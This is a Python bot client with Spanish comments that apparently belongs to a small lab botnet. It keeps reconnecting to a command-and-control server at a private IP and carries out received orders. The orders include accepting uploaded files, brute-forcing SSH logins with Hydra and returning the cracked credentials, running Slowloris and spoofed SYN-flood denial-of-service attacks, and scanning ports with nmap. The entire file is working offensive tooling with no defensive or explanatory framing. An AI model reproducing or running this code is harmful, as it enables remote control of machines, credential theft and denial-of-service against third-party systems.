import socket
import subprocess
import time
import os
import base64
import shlex
import threading
import shutil
import re
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style

# Inicializamos colorama para que funcione en todas las consolas
colorama.init()

# Configuración del C2
C2_SERVER = '192.168.56.11'
C2_PORT   = 8888
TMP_DIR   = os.path.expanduser("~/.bot_tmp")
os.makedirs(TMP_DIR, exist_ok=True)

def check_files(path):
    """Comprueba existencia, permisos y no vacío."""
    if not os.path.exists(path):
        return False, f"No encontrado: {path}"
    if not os.access(path, os.R_OK):
        return False, f"Sin permiso de lectura: {path}"
    if os.path.getsize(path) == 0:
        return False, f"Archivo vacío: {path}"
    return True, ""

def execute_command(command):
    try:
        parts = shlex.split(command)
        if not parts:
            return "RESULT ERROR Comando vacío"

        # ---------------- RECEPCIÓN DE FICHEROS ----------------
        if parts[0] == "SEND_FILE":
            if len(parts) < 3:
                return "RESULT ERROR Comando SEND_FILE incompleto"
            filename = parts[1]
            b64data  = ' '.join(parts[2:])
            try:
                data = base64.b64decode(b64data)
            except Exception:
                return "RESULT ERROR SEND_FILE: falló decodificación Base64"
            outpath = os.path.join(TMP_DIR, os.path.basename(filename))
            try:
                with open(outpath, "wb") as f:
                    f.write(data)
                return f"RESULT FILE_SAVED {outpath}"
            except Exception as e:
                return f"RESULT ERROR SEND_FILE: no se pudo escribir {outpath}: {e}"

        # ---------------- SSH BRUTE (Hydra) ----------------
        if parts[0] == "HYDRA":
            if not shutil.which("hydra"):
                return "RESULT ERROR 'hydra' no instalado"
            service, target_url = parts[1], parts[2]
            parsed = urlparse(target_url)
            host   = parsed.hostname
            port   = parsed.port or 22

            # Archivos ya recibidos en TMP_DIR
            usr  = os.path.join(TMP_DIR, parts[3])
            pwd  = os.path.join(TMP_DIR, parts[4])
            for path, name in ((usr, "usuarios"), (pwd, "contraseñas")):
                ok, err = check_files(path)
                if not ok:
                    return f"RESULT ERROR HYDRA {name}: {err}"

            print(f"{Fore.YELLOW}[!] Ejecutando Hydra en {host}:{port}{Style.RESET_ALL}")
            cmd = [
                'hydra',
                '-L', usr,            # lista de usuarios
                '-P', pwd,            # lista de contraseñas
                '-t', '64',           # 64 conexiones paralelas
                '-w', '2',            # timeout de 2s por intento
                '-W', '0',            # sin espera interna
                '-f',                 # parar al encontrar primera credencial
                '-V',                 # verbose
                f"ssh://{host}:{port}"
            ]
            try:
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                out = res.stdout + res.stderr
                creds = re.findall(r'login:\s*(\S+).*?password:\s*(\S+)', out, re.DOTALL)
                if creds:
                    pairs = ' | '.join(f"{u}:{p}" for u, p in creds)
                    return f"RESULT HYDRA_SUCCESS {pairs}"
                return "RESULT HYDRA_FAILED No se encontraron credenciales"
            except subprocess.TimeoutExpired:
                return "RESULT ERROR HYDRA: tiempo máximo excedido"
            except Exception as e:
                return f"RESULT ERROR HYDRA excepción: {e}"

        # ---------------- HTTP FLOOD / SLOWLORIS ----------------
        if parts[0] == "SLOWLORIS":
            if not shutil.which("slowhttptest"):
                return "RESULT ERROR 'slowhttptest' no instalado"
            host, port, duration = parts[1], parts[2], parts[3]
            try:
                dur = int(duration)
            except ValueError:
                return "RESULT ERROR Slowloris: duración inválida"
            url = f"http://{host}:{port}"
            proc = subprocess.Popen([
                'slowhttptest','-c','1000','-H','-i','10',
                '-r','200','-t','GET','-u',url,'-p','3','-l',str(dur)
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(dur + 5)
            proc.kill()

            # Comprobación
            try:
                import requests
            except ImportError:
                return "RESULT ERROR Slowloris: falta módulo requests"
            try:
                r = requests.get(url, timeout=5, allow_redirects=False)
                if r.status_code >= 500 or "503" in r.text.lower():
                    return "RESULT SLOWLORIS_SUCCESS"
                return "RESULT SLOWLORIS_FAILED"
            except:
                # Si no responde, asumimos éxito
                return "RESULT SLOWLORIS_SUCCESS"

        # ---------------- SYN FLOOD (hping3) ----------------
        elif parts[0].upper().startswith("HPING3_"):
            # Comprueba existencia de hping3
            if not shutil.which("hping3"):
                return "RESULT ERROR 'hping3' no instalado"

            atype = parts[0].split('_', 1)[1].upper()
            if atype != "SYN":
                return f"RESULT ERROR HPING3 tipo desconocido: {atype}"
            if len(parts) < 4:
                return "RESULT ERROR HPING3 comando incompleto"

            target, port, duration = parts[1], parts[2], parts[3]
            try:
                dur = int(duration)
            except ValueError:
                return "RESULT ERROR HPING3: duración inválida"

            print(f"{Fore.YELLOW}[!] SYN flood a {target}:{port} durante {dur}s{Style.RESET_ALL}")

            cmd = [
                'hping3',
                '-S',               # SYN
                '--flood',          # sin pausas
                '--rand-source',    # IP aleatoria
                '-a', '6.6.6.6',    # IP spoof fija
                '-p', port,         # puerto destino
                '-d', '120',        # tamaño payload
                '-V', target        # verbose para arrancar
            ]

            # Lanza el proceso en background, silenciando toda salida
            proc = subprocess.Popen(cmd,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)

            # Programa un temporizador para terminarlo tras dur segundos
            killer = threading.Timer(dur, proc.terminate)
            killer.start()

            # Espera a que termine (bien por terminate o por salir)
            proc.wait()
            killer.cancel()

            # Siempre devolvemos un mensaje genérico de éxito
            return "RESULT ATTACK_COMPLETED HPING3_SYN"
        
        # ---------------- PORT SCAN (nmap) ----------------
        if parts[0] == "NMAP_SCAN":
            if not shutil.which("nmap"):
                return "RESULT ERROR 'nmap' no instalado"
            target = parts[1]
            print(f"{Fore.YELLOW}[!] Escaneando puertos en {target}{Style.RESET_ALL}")
            res = subprocess.run(
                ['nmap','-sV','-T4','-Pn','-p','64000-64300',target],
                capture_output=True,text=True,timeout=120
            )
            lines = res.stdout.splitlines()
            ports = [f"{m.group(1)} ({m.group(2)})"
                     for line in lines
                     if (m := re.match(r'^(\d+)/tcp\s+(?:open|open\|filtered)\s+(\S+)', line))]
            if ports:
                return "RESULT NMAP_SCAN: " + " | ".join(ports)
            return "RESULT NMAP_SCAN: No se encontraron puertos abiertos"

        return "RESULT UNKNOWN"

    except Exception as e:
        return f"RESULT ERROR EXCEPCIÓN: {e}"

def connect_to_c2():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((C2_SERVER, C2_PORT))
            while True:
                cmd = client.recv(4096).decode()
                if cmd:
                    resp = execute_command(cmd)
                    client.send(resp.encode())
        except Exception:
            print(f"{Fore.RED}[!] Reconectando...{Style.RESET_ALL}")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_c2()